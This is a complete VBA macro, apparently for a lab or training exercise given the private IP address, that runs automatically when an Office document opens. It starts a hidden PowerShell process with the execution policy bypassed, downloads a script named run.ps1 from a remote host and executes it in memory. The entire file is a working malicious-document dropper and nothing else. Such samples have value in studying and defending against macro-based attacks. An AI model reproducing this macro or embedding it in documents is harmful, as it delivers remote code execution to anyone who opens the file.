Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim cmd As String
    Dim psCommand As String
    psCommand = "powershell -NoP -Exec Bypass -W Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.242/run.ps1');"""
    Shell psCommand, 0
End Sub